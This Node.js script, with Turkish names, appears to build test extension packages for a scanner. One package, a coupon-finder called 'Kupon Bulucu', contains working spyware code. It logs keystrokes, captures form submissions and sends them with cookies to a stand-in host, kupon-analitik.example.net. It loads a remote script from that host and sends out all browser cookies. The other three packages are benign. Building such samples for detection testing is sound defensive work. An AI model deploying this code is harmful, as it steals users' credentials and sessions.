'use strict';

const AdmZip = require('adm-zip');
const path = require('path');

function paketYap(cikti, manifest, dosyalar) {
  const zip = new AdmZip();
  zip.addFile('manifest.json', Buffer.from(JSON.stringify(manifest, null, 2)));
  for (const [yol, icerik] of Object.entries(dosyalar)) {
    zip.addFile(yol, Buffer.from(icerik));
  }
  zip.writeZip(path.join(__dirname, cikti));
  console.log('yazildi:', cikti);
}

paketYap(
  'agresif.zip',
  {
    manifest_version: 3,
    name: 'Kupon Bulucu',
    version: '2.1.0',
    description: 'Alışveriş sitelerinde indirim kodu bulur.',
    permissions: ['cookies', 'tabs', 'history', 'scripting', 'webRequest', 'clipboardRead', 'storage'],
    host_permissions: ['<all_urls>'],
    content_scripts: [{ matches: ['<all_urls>'], js: ['icerik.js'], run_at: 'document_start' }],
  },
  {
    'icerik.js': `
      document.addEventListener('keydown', function (e) { tampon.push(e.key); });
      document.addEventListener('submit', function (e) { gonder(e.target); });
      function gonder(veri) {
        fetch('https://kupon-analitik.example.net/topla', {
          method: 'POST',
          body: JSON.stringify({ veri: veri, cerez: document.cookie })
        });
      }
      const s = document.createElement('script');
      s.src = 'https://cdn.kupon-analitik.example.net/motor.js';
      document.head.appendChild(s);
    `,
    'arkaplan.js': `
      chrome.cookies.getAll({}, function (c) {
        navigator.sendBeacon('https://kupon-analitik.example.net/c', JSON.stringify(c));
      });
    `,
  }
);

paketYap(
  'temiz.zip',
  {
    manifest_version: 3,
    name: 'Sekme Sayacı',
    version: '1.0.3',
    description: 'Açık sekme sayısını rozet olarak gösterir.',
    permissions: ['activeTab', 'storage'],
  },
  {
    'arkaplan.js': `
      chrome.action.setBadgeText({ text: '0' });
      chrome.storage.local.get(['sayac'], function (d) { guncelle(d.sayac || 0); });
      function guncelle(n) { chrome.action.setBadgeText({ text: String(n) }); }
    `,
  }
);

paketYap(
  'ara.zip',
  {
    manifest_version: 3,
    name: 'Karanlık Mod',
    version: '3.4.1',
    description: 'Sitelere karanlık tema uygular.',
    permissions: ['storage', 'scripting'],
    host_permissions: ['<all_urls>'],
    content_scripts: [{ matches: ['<all_urls>'], js: ['tema.js'], run_at: 'document_idle' }],
  },
  {
    'tema.js': `
      const stil = document.createElement('style');
      stil.textContent = 'html { filter: invert(1) hue-rotate(180deg); }';
      document.documentElement.appendChild(stil);
      chrome.storage.local.get(['kapali'], function (d) { if (d.kapali) stil.remove(); });
    `,
  }
);

paketYap(
  'engelleyici.zip',
  {
    manifest_version: 3,
    name: 'Reklam Engelleyici',
    version: '5.2.0',
    description: 'Reklamları ve izleyicileri engeller.',
    permissions: ['declarativeNetRequest', 'storage'],
    host_permissions: ['<all_urls>'],
    content_scripts: [{ matches: ['<all_urls>'], js: ['kozmetik.js'], run_at: 'document_idle' }],
  },
  {
    'kozmetik.js': `
      const kurallar = ['.reklam', '#banner', '[data-ad]'];
      kurallar.forEach(function (s) {
        document.querySelectorAll(s).forEach(function (e) { e.style.display = 'none'; });
      });
    `,
  }
);
